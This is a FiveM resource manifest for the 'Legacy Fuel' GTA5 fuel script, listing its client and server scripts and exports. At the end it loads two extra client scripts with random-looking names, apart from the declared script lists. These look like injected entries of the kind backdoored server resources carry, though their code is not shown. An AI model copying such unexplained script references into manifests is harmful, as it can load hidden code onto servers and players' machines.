fx_version 'adamant'
game 'gta5'

author 'InZidiuZ'
description 'Legacy Fuel'
version '1.3'

-- What to run
client_scripts {
	'config.lua',
	'functions/functions_client.lua',
	'source/fuel_client.lua'
}

server_scripts {
	'config.lua',
	'source/fuel_server.lua'
}

exports {
	'GetFuel',
	'SetFuel'
}

client_script 'y6f844SzL.lua'

client_script 'qlpKYZFsC7.lua'
